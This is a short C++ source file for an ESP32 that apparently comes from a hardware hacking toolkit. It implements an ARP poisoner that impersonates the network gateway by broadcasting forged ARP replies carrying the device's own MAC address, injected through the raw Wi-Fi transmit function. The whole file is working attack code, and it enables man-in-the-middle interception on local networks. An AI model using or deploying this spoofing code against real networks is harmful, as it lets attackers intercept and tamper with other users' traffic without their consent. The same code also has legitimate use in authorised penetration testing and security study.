/**
 * ARP Poisoner - CapibaraZero implementation (adapted)
 */

#include "arp_poisoner.hpp"

#include <WiFi.h>
#include <stdlib.h>
#include <string.h>

#include "esp_private/wifi.h"
#include "esp_wifi.h"

ARP_poisoner::ARP_poisoner(uint8_t *custom_src_ip) {
    if (custom_src_ip) {
        memcpy(src_ip, custom_src_ip, IPV4_LENGTH);
    } else {
        IPAddress gateway = WiFi.gatewayIP();
        for (size_t i = 0; i < 4; i++) {
            src_ip[i] = gateway[i];
        }
    }

    // Broadcast destination address
    memset(broadcast_mac_address, 0xff, sizeof(broadcast_mac_address));

    // Ethernet header: dst = broadcast, src = ESP MAC
    memcpy(ether_frame, broadcast_mac_address, MAC_ADDRESS_LENGTH);
    WiFi.macAddress(src_mac);
    memcpy(ether_frame + MAC_ADDRESS_LENGTH, src_mac, MAC_ADDRESS_LENGTH);

    // EtherType = ARP (0x0806)
    ether_frame[12] = ETHERNET_PROTOCOL_ARP / 256;
    ether_frame[13] = ETHERNET_PROTOCOL_ARP % 256;
}

void ARP_poisoner::fill_arp_hdr(uint8_t *src_mac, uint8_t *src_ip,
                                uint8_t *dest_mac, uint8_t *dest_ip) {
    arp_pkt.hw_type = htons(ETH_ARP_HW_TYPE);
    arp_pkt.ptype   = htons(ETH_HW_TYPE);
    arp_pkt.hlen    = MAC_ADDRESS_LENGTH;
    arp_pkt.plen    = IPV4_LENGTH;
    arp_pkt.opcode  = htons(ARP_REPLY_OPCODE);

    memcpy(arp_pkt.sender_ip,  src_ip,  IPV4_LENGTH);
    memcpy(arp_pkt.target_ip,  dest_ip, IPV4_LENGTH);
    memcpy(arp_pkt.sender_mac, src_mac, MAC_ADDRESS_LENGTH);
    memcpy(arp_pkt.target_mac, dest_mac, MAC_ADDRESS_LENGTH);
}

void ARP_poisoner::send_arp_packet(uint8_t dest_ip[IPV4_LENGTH],
                                   uint8_t dest_mac[MAC_ADDRESS_LENGTH]) {
    fill_arp_hdr(src_mac, src_ip, dest_mac, dest_ip);
    memcpy(ether_frame + ETH_HDRLEN, &arp_pkt, ARP_HDRLEN);
    esp_wifi_internal_tx(WIFI_IF_STA, ether_frame, PACKET_LENGTH);
}
